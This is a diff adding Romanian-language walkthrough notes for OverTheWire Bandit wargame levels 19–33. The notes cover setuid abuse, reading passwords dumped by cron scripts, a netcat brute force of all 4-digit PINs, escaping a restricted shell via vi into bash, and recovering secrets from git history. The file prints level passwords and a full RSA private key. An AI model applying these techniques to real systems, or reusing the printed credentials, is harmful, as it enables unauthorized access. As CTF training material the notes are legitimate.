@@ -1,0 +1,245 @@
+LEVEL 19->20
+./bandit20-do cat /etc/bandit_pass/bandit20\
+parola:VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+LEVEL 20->21
+Folosim comanda ls -l si vedem ca este un script suconnect care trebuie sa primeasca ca si argument un port
+echo VxCazJaVykI6W36BkBU0mJTCM8rR95XT | nc -l 3333 &   // pentru a deschide un server pe portul 3333 si  care primeste parola 
+Apoi dam 
+./suconnect 3333
+Read: VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+Password matches, sending next password
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+parola:NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+LEVEL 21->22
+cd /etc/cron.d
+ls -l 
+Si observam ca exista fisierul cronjob_bandit22
+cat cronjob_bandit22     // pentru a vedea ce contine
+	@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+cat /usr/bin/cronjob_bandit22.sh
+	#!/bin/bash
+	chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+	cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv 
+
+parola:WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+
+LEVEL 22->23
+cd /etc/cron.d
+ls -l
+cat cronjob_bandit22
+	@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+	* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+cat /usr/bin/cronjob_bandit23.sh
+	#!/bin/bash
+
+	myname=$(whoami)
+	mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+	echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+	cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+	8ca319486bfbbc3663ea0fbe81326349
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+parola:QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+
+
+LEVEL 23->24
+cd /tmp/abc
+cat bandit24pass
+parola:VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+
+NIVEL 24->25
+mkdir /tmp/orice
+chmod 777 /tmp/orice  // pentru a folosi si la nivele celelalte acest director ca sa nu creeze de fiecare data altul
+pentru ca trebuie sa trimit parola si codul pin, fac un script care sa afiseze toate cazurile posibile, iar apoi il voi redirecta catre un alt fisierul
+vim a
+	CONTINUT :
+		#!/bin/bash
+		for i in {0000..9999}
+		do 
+			echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
+		done
+chmod 777 a
+./a > fisier.txt
+nc localhost 30002 < fisier.txt
+
+parola:p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
+
+NIVEL 25->26
+ls 
+cat cat bandit26.sshkey
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
+pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
+/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
+xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
+1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
+3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
+qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
+il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
+e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
+Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
+zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
+c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
+wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
+tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
+2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
+i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
+6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
+pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
+JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
+JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
+1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
+ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
+euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
+/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
+IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
+-----END RSA PRIVATE KEY-----
+ssh -i bandit26.sshkey bandit26@localhost -p 2220
+fac fereastra mica, apoi dupa ce introduc "yes" apas tasta "v" pentru a intra in modul de scriere si introduc :e /etc/bandit_pass/bandit26
+si obtin parola.
+parola:c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
+
+apoi introduc :set shell=/bin/bash si :shell pentru a intra pe bandit26
+
+LEVEL 26->27
+dupa ce am intrat in shell prin metoda de mai sus
+ls -l 
+./bandit27-do cat /etc/bandit\_pass/bandit27
+parola:YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
+
+
+LEVEL 27->28
+mkdir /tmp/bandit27
+cd /tmp/bandit27 
+git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo si introduc parola de mai sus
+ls -l
+cd repo
+ls 
+cat README
+parola:AVanL161y9rsbcJIsFHuw35rjaOM19nR
+
+
+LEVEL 28->29
+mkdir /tmp/bandit28
+cd /tmp/bandit28
+git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo si introduc parola de sus
+ls 
+cd repo 
+cat README.md
+
+git log
+commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Sun Apr 23 18:04:39 2023 +0000
+
+    fix info leak
+
+commit abcff758fa6343a0d002a1c0add1ad8c71b88534
+Author: Morla Porla <morla@overthewire.org>
+Date:   Sun Apr 23 18:04:39 2023 +0000
+
+    add missing data
+
+commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78
+Author: Ben Dover <noone@overthewire.org>
+Date:   Sun Apr 23 18:04:39 2023 +0000
+
+    initial commit of README.md
+	
+si observam ca a fost o scurgere de informatii la 899ba88df296331cc01f30d022c006775d467f28
+
+git show 899ba88df296331cc01f30d022c006775d467f28
+commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -> master, origin/master, origin/HEAD)
+Author: Morla Porla <morla@overthewire.org>
+Date:   Sun Apr 23 18:04:39 2023 +0000
+
+    fix info leak
+
+diff --git a/README.md b/README.md
+index b302105..5c6457b 100644
+--- a/README.md
++++ b/README.md
+@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
+ ## credentials
+ 
+ - username: bandit29
+-- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
++- password: xxxxxxxxxx
+
+
+parola:tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+
+LEVEL 29->30
+mkdir /tmp/b29-30
+cd /tmp/b29-30
+git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+ls
+cd repo
+cat README.md , dar nu exista informatii in legatura cu vreo scurgere cum a fost la exercitiul anterior
+git branch -a si observam ca exista ramura dev si comutam pe ea
+git checkout dev 
+ls -l 
+cat README.md 
+parola:xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
+
+
+LEVEL 30->31
+mkdir /tmp/b30-31
+cd /tmp/b30-31
+ls 
+cd repo
+ls 
+cat README.md si contine "just an epmty file... muahaha"
+comanda git log nu ofera nicio informatie utila si nici git branch -a 
+git tag 
+git show secret 
+parola: OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
+
+
+LEVEL 31->32
+mkdir /tmp/b31-32
+cd /tmp/b31-32
+git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo 
+ls -l
+cd repo
+ls -l 
+cat README.md
+		This time your task is to push a file to the remote repository.
+
+	Details:
+		File name: key.txt
+		Content: 'May I come in?'
+		Branch: master
+	
+echo "May I come in?" > file.txt
+
+git add file.txt -f 
+git commit 
+git push 
+parola:rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
+
+LEVEL 32->33
+
+$0
+ls -la
+	total 28
+	drwxr-xr-x  2 root     root     4096 May  7  2020 .
+	drwxr-xr-x 41 root     root     4096 May  7  2020 ..
+	-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
+	-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
+	-rw-r--r--  1 root     root      675 May 15  2017 .profile
+	-rwsr-x---  1 bandit33 bandit32 7556 May  7  2020 uppershell
+	 cat /etc/bandit_pass/bandit33
+parola:odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
